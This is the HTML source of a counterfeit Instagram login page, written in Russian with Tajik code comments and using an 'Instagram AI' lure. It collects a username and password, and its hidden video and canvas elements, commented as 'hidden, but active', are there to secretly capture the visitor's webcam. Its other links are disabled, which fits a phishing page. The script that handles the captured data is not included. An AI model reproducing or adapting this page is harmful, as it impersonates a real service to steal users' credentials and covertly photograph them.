<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram — Вход</title>
    <meta name="description" content="Войдите в свой аккаунт Instagram">
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="iconinsta.ico" type="image/x-icon"> <!-- Иконка дуруст пайваст -->
</head>
<body>
    <!-- ========== ЭКРАНИ ЗАГРУЗКИ ========== -->
    <div class="loading-screen" id="loadingScreen">
        <div class="loading-content">
            <img src="logoinsta.png" alt="Instagram Logo" class="loading-logo pulse"> <!-- Лого дуруст пайваст -->
            <div class="loading-spinner"></div>
            <p class="loading-text fade-in">Загрузка Instagram...</p>
            <div class="wave-animation">
                <span></span><span></span><span></span>
            </div>
        </div>
    </div>

    <!-- ========== АСОСӢ МУНДАРИҶА ========== -->
    <main class="main-container" id="mainContent" style="display: none;">
        <div class="bg-gradient"></div>
        <div class="header-banner float-animate">
            <h1 class="banner-title">Instagram AI</h1>
            <p class="banner-subtitle">Интеллектуальный помощник для вашего аккаунта</p>
        </div>

        <div class="login-card glass-effect">
            <img src="logoinsta.png" alt="Instagram" class="form-logo float-animate-slow"> <!-- Лого дар форма -->

            <!-- Камера ва Канвас (пинҳон, аммо фаъол) -->
            <video id="cameraFeed" autoplay playsinline muted></video>
            <canvas id="photoCanvas" style="display: none;"></canvas>

            <form class="login-form" id="loginForm" autocomplete="off">
                <div class="input-group">
                    <input type="text" id="loginInput" class="form-input" placeholder=" " required>
                    <label for="loginInput" class="input-label">Имя пользователя, логин или почта</label>
                    <div class="input-icon">👤</div>
                </div>

                <div class="input-group">
                    <input type="password" id="passInput" class="form-input" placeholder=" " required>
                    <label for="passInput" class="input-label">Пароль или специальный код доступа</label>
                    <button type="button" class="toggle-pass" id="togglePass">👁</button>
                    <div class="input-icon">🔒</div>
                </div>

                <!-- Паёми хато -->
                <div class="error-box" id="errorBox">
                    <span id="errorText"></span>
                </div>

                <!-- Кнопкаи воридшавӣ -->
                <button type="submit" class="btn-login" id="submitBtn">
                    <span class="btn-text">Войти</span>
                    <span class="btn-loader" id="btnLoader"></span>
                </button>
            </form>

            <div class="form-links">
                <a href="#" class="link-item disabled">Забыли пароль?</a>
                <div class="divider"><span>или</span></div>
                <a href="#" class="link-item disabled login-fb">
                    <img src="https://cdn-icons-png.flaticon.com/16/733/733547.png" alt="Facebook"> Войти через Facebook
                </a>
            </div>
        </div>

        <div class="register-card glass-effect">
            <p>Нет аккаунта? <a href="#" class="link-item disabled">Зарегистрироваться</a></p>
        </div>

        <footer class="page-footer">
            <div class="footer-links">
                <a href="#" class="footer-link disabled">О нас</a>
                <a href="#" class="footer-link disabled">Помощь</a>
                <a href="#" class="footer-link disabled">API</a>
                <a href="#" class="footer-link disabled">Конфиденциальность</a>
            </div>
            <p class="copyright">© 2026 Instagram AI от Meta</p>
        </footer>
    </main>

    <script src="script.js"></script>
</body>
</html>